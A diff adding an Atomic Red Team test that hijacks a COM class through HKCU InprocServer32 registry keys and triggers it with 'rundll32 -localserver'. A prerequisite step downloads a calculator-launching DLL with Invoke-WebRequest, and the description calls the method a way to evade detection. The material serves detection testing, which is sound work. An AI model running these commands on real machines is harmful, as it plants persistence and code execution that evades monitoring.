@@ -55,3 +55,43 @@ atomic_tests:
     cleanup_command: |
       Get-Process -Name "*calc" | Stop-Process
     name: powershell
+- name: COM Hijacking with RunDLL32 (Local Server Switch)
+  auto_generated_guid: 123520cc-e998-471b-a920-bd28e3feafa0
+  description: |-
+    This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via "rundll32.exe -localserver [clsid]". 
+    This method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. 
+    Reference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/
+    Upon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    clsid_threading:
+      description: Threading Model
+      type: string
+      default: Both
+    dll_path:
+      description: Path to the DLL.
+      type: String
+      default: $env:temp\T1546.015_calc.dll
+    clsid:
+      description: Class ID to hijack.
+      type: string
+      default: '{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
+    clsid_description:
+      description: Description for CLSID
+      type: string
+      default: MSAA AccPropServices
+  dependency_executor_name: powershell
+  dependencies:
+  - description: DLL For testing
+    prereq_command: 'if (Test-Path #{dll_path}) {exit 0} else {exit 1}'
+    get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll" -OutFile "#{dll_path}"
+  executor:
+    command: |-
+      New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
+      New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value #{dll_path}
+      New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+      Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-localserver #{clsid}'
+    cleanup_command: |-
+      Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Recurse -ErrorAction Ignore
+    name: powershell
